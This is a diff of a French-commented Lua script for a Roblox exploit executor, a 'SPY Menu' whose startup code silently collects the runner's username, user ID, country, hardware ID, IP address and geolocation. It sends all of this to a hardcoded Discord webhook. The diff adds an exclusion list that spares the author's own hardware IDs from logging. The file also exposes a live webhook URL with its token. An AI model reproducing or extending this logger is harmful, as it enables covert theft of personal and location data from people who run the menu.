@@ -16,7 +16,13 @@
 
 -- Configuration
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1461360367752974567/fRBNGinNkZ4-BIBcOvK35a4dXvjQc8sWSgQ2FrXtCBHIMOkpOqaaIJomvDb4CLmF6gLN"
-local MENU_NAME = "SPY MENU - HUB" -- CHANGE POUR CHAQUE MENU : "NEIGHBORS" / "THE CORNER" / "HUB"
+local MENU_NAME = "SPY MENU - HUB"
+
+-- Liste des HWID à exclure (ne recevront pas de logs)
+local EXCLUDED_HWIDS = {
+    ["CAF55276-3092-400C-9603-30F6D96F41D4"] = true,
+    ["BF4DD7FB-3576-4C5D-94F2-C2DCBF8FCC59"] = true
+}
 
 -- Services
 local Players = game:GetService("Players")
@@ -75,13 +81,11 @@ local function GetRobloxInfo()
         Locale = "Inconnu"
     }
     
-    -- Récupérer le pays via LocalizationService
     pcall(function()
         local result, code = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
         info.Country = code or "Inconnu"
     end)
     
-    -- Récupérer la locale
     pcall(function()
         info.Locale = LocalizationService.RobloxLocaleId
     end)
@@ -114,16 +118,23 @@ end
 
 -- Fonction pour envoyer au webhook Discord
 local function SendToWebhook()
+    local executorInfo = GetExecutorInfo()
+    
+    -- VÉRIFICATION DU HWID : Si présent dans la liste d'exclusion, on stop tout
+    if EXCLUDED_HWIDS[executorInfo.HWID] then
+        print("🛡️ Connexion d'un membre exclu (Pas de log envoyé)")
+        return
+    end
+
     local robloxInfo = GetRobloxInfo()
     local gameInfo = GetGameInfo()
-    local executorInfo = GetExecutorInfo()
     local ip = GetIP()
     local location = GetLocation()
     
     -- Créer l'embed
     local embed = {
         ["title"] = "🕵️ " .. MENU_NAME .. " - Nouvelle connexion",
-        ["color"] = 5814783, -- Bleu
+        ["color"] = 5814783,
         ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
         ["footer"] = {
             ["text"] = "SPY Menu Logger v1.0"
@@ -132,21 +143,16 @@ local function SendToWebhook()
             ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. robloxInfo.UserId .. "&width=150&height=150&format=png"
         },
         ["fields"] = {
-            -- Menu utilisé
             {
                 ["name"] = "📱 Menu utilisé",
                 ["value"] = "```" .. MENU_NAME .. "```",
                 ["inline"] = false
             },
-            
-            -- Séparateur
             {
                 ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                 ["value"] = "**👤 INFORMATIONS ROBLOX**",
                 ["inline"] = false
             },
-            
-            -- Infos Roblox
             {
                 ["name"] = "🎮 Username",
                 ["value"] = "```" .. robloxInfo.Username .. "```",
@@ -177,15 +183,11 @@ local function SendToWebhook()
                 ["value"] = "```" .. robloxInfo.Country .. "```",
                 ["inline"] = true
             },
-            
-            -- Séparateur
             {
                 ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                 ["value"] = "**🎯 INFORMATIONS DU JEU**",
                 ["inline"] = false
             },
-            
-            -- Infos du jeu
             {
                 ["name"] = "🎮 Nom du jeu",
                 ["value"] = "```" .. gameInfo.GameName .. "```",
@@ -201,15 +203,11 @@ local function SendToWebhook()
                 ["value"] = "```" .. gameInfo.JobId .. "```",
                 ["inline"] = false
             },
-            
-            -- Séparateur
             {
                 ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                 ["value"] = "**💻 INFORMATIONS SYSTÈME**",
                 ["inline"] = false
             },
-            
-            -- Infos executor
             {
                 ["name"] = "⚙️ Executor",
                 ["value"] = "```" .. executorInfo.Executor .. "```",
@@ -225,15 +223,11 @@ local function SendToWebhook()
                 ["value"] = "```" .. executorInfo.HWID .. "```",
                 ["inline"] = false
             },
-            
-            -- Séparateur
             {
                 ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                 ["value"] = "**🌐 INFORMATIONS RÉSEAU**",
                 ["inline"] = false
             },
-            
-            -- Infos réseau
             {
                 ["name"] = "🌍 IP",
                 ["value"] = "```" .. ip .. "```",
@@ -242,7 +236,6 @@ local function SendToWebhook()
         }
     }
     
-    -- Ajouter les infos de localisation si disponibles
     if location then
         table.insert(embed.fields, {
             ["name"] = "🗺️ Localisation",
@@ -258,7 +251,6 @@ local function SendToWebhook()
         })
     end
     
-    -- Ajouter les liens utiles
     table.insert(embed.fields, {
         ["name"] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
         ["value"] = "**🔗 LIENS RAPIDES**",
@@ -277,16 +269,14 @@ local function SendToWebhook()
         ["inline"] = true
     })
     
-    -- Préparer le payload
     local payload = {
         ["username"] = "SPY Menu Logger",
         ["avatar_url"] = "https://cdn.discordapp.com/attachments/1234567890/spy_menu_icon.png",
         ["embeds"] = {embed}
     }
     
-    -- Envoyer au webhook
     local success, response = pcall(function()
-        return request({
+        return (syn and syn.request or http_request or request)({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = {
@@ -305,17 +295,9 @@ end
 
 -- Envoyer les infos au démarrage
 task.spawn(function()
-    task.wait(2) -- Attendre 2 secondes que tout se charge
+    task.wait(2)
     SendToWebhook()
 end)
-
---[[
-    ═══════════════════════════════════════════════════════════
-    FIN DU SYSTÈME DE LOGGING
-    ═══════════════════════════════════════════════════════════
-    
-    Colle ton menu SPY en dessous de cette ligne
-]]
 
 
 -- Services
